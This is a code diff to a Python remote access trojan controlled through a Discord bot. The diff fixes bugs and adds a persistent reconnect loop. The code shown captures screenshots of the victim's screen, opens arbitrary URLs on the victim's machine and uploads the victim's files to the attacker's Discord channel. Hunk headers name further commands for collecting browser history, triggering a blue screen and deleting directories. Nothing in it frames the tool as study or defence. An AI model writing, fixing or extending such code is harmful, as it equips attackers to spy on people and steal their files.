@@ -10,7 +10,6 @@ import asyncio
 import discord
 from discord.ext import commands
 import pyautogui
-import io
 import socket
 import subprocess
 import pyperclip
@@ -35,7 +34,6 @@ import pyaes
 import random
 import re
 import traceback
-import logging
 import zlib
 import winreg
 import requests
@@ -43,6 +41,7 @@ import tempfile
 import urllib3
 from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
 from discord import TextChannel, Embed, Color
+import io
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 disable_warnings_urllib3()
@@ -637,6 +636,8 @@ async def recent(ctx, browser: str = "chrome"):
             f"An error occurred while collecting browsing history: {e}{watermark()}"
         )
 
+from discord import File
+
 @bot.command()
 async def screen(ctx):
     try:
@@ -644,7 +645,7 @@ async def screen(ctx):
         img_bytes = io.BytesIO()
         screenshot.save(img_bytes, format="PNG")
         img_bytes.seek(0)
-        await ctx.send(file=discord.File(img_bytes, "screenshot.png"))
+        await ctx.send(file=File(img_bytes, "screenshot.png"))
         await ctx.send(f"Screenshot captured{watermark()}")
     except Exception as e:
         await ctx.send(f"Error capturing screenshot: {e}{watermark()}")
@@ -706,7 +707,7 @@ async def bsod(ctx):
 @bot.command()
 async def url(ctx, *, url: str):
     try:
-        url = "http://" + url if not url.startswith(("http://", "https://")) : url
+        url = "http://" + url if not url.startswith(("http://", "https://")) else url
         webbrowser.open(url)
         await ctx.send(f"🌐 Opened URL: {url}{watermark()}")
     except Exception as e:
@@ -994,17 +995,20 @@ async def rmd(ctx, *, dirname: str):
     except Exception as e:
         await ctx.send(f"Error deleting directory: {e}{watermark()}")
 
+from discord import File
+
 @bot.command()
 async def download(ctx, *, filename: str):
     try:
         target = os.path.join(current_dir, filename)
         if os.path.isfile(target):
-            await ctx.send(file=discord.File(target))
+            await ctx.send(file=File(target))
             await ctx.send(f"File sent: `{filename}`{watermark()}")
         else:
             await ctx.send(f"File not found: `{filename}`{watermark()}")
     except Exception as e:
         await ctx.send(f"Error sending file: {e}{watermark()}")
+
 
 @bot.command()
 async def uuid(ctx):
@@ -1243,11 +1247,17 @@ async def on_ready():
 
 ssl_context = ssl.create_default_context()
 ssl_context.load_verify_locations(certifi.where())
-
+RETRY_DELAY = 5
 async def start_bot():
-    async with aiohttp.ClientSession() as session:
-        async with bot:
-            bot.http.connector = aiohttp.TCPConnector(ssl=ssl_context)
-            await bot.start(TOKEN)
+    while True:
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with bot:
+                    bot.http.connector = aiohttp.TCPConnector(ssl=ssl_context)
+                    await bot.start(TOKEN)
+        except Exception as e:
+            print(f"❌ Failed to start bot: {e}")
+            print(f"🔁 Retrying in {RETRY_DELAY} seconds...")
+            await asyncio.sleep(RETRY_DELAY)
 
 asyncio.run(start_bot())
